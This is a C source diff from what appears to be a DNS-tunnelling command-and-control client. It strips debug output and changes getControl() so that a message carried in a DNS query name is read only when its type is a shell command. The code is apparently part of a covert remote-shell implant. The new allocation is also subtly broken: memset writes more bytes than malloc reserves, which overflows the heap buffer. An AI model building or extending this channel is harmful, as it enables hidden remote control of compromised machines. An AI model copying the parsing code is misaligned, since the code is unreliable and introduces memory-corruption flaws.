@@ -464,8 +464,6 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 
 	/* fetch dns header fields from reply */
 	fetchShort(&(response->dnsHeader.id), 	    _recvBuff, &buffIndex);
-
-	puts("finished first fetch \n");
 	fetchShort(&(response->dnsHeader.flags),    _recvBuff, &buffIndex);
 	fetchShort(&(response->dnsHeader.qdcode),   _recvBuff, &buffIndex);
 	fetchShort(&(response->dnsHeader.ancount),  _recvBuff, &buffIndex);
@@ -474,7 +472,6 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 
 	/* fetch dns question section from reply */
 	int qNameLen = strlen(&(_recvBuff[buffIndex])) + 1;
-	printf("qNameLen: %u \n", qNameLen);
 	response->dnsQuestion.qname = malloc(sizeof(unsigned char)*qNameLen);
 
 	fetchString(response->dnsQuestion.qname,    _recvBuff, qNameLen, &buffIndex);
@@ -533,7 +530,7 @@ void printControlFields(struct CONTROL *c)
 	printf("[+] Printing Control Fields \n");
 
 	// printing dns header
-	printf("Client id: %u \n", 		c->clientId);
+	//printf("Client id: %u \n", 		c->clientId);
 	printf("Message Type: %u \n", 	c->messageType);
 	printf("Message Length: %u \n", c->messsageLength);
 	printf("Message <task>: "); stringPrinter(c->message, c->messsageLength);
@@ -548,18 +545,13 @@ void printControlFields(struct CONTROL *c)
 struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 {
 	if(debug)
-	{
 		printf("===== getControl() ===== 	\n");
-	}
 
 	struct CONTROL *ctrl = malloc(sizeof(struct CONTROL));
 
-	char endOfStr = '\0';
 	int z = 0;
 	unsigned char labelLength;
 	fetchChar(&labelLength, drp->dnsQuestion.qname, &z);
-	//printf("label length: %u \n", labelLength);
-
 	int offset = MESSAGE_TYPE_PARSE_OFFSET;
 
 	/* get messageType */
@@ -568,24 +560,26 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 	/* get messageLength */
 	fetchChar(&(ctrl->messsageLength), drp->dnsQuestion.qname, &offset);
 
-	//printf("orig mesg length: %u \n", ctrl->messsageLength);
-
 	if(ctrl->messsageLength > labelLength)
 	{
 		//puts("messageLength is way too longer! ");
 		ctrl->messsageLength = labelLength;
 	}
 
-	/* get message itself */
-	// 1.) allocate storage for message (+1 byte for null termination)
-	ctrl->message = malloc(sizeof(ctrl->messsageLength)*sizeof(unsigned char)+1);
-	fetchString(ctrl->message,
-					drp->dnsQuestion.qname,
-						ctrl->messsageLength,
-							&offset);
+	// only get message if type = command
+	if (ctrl->messageType == MESSAGE_TYPE_SHELL_CMD)
+	{
+		// 1.) allocate storage for message (+1 byte for null termination)
+		ctrl->message = malloc(sizeof(ctrl->messsageLength)*sizeof(unsigned char)+1);
 
-	// null terminate string
-	putChar(ctrl->message, &endOfStr, &offset);
+		// empty out buffer
+		memset(ctrl->message, 0, ctrl->messsageLength+1);
+
+		fetchString(ctrl->message,
+						drp->dnsQuestion.qname,
+							ctrl->messsageLength,
+								&offset);
+	}
 
 	if(debug)
 		printf("====/end getControl() ==== \n");
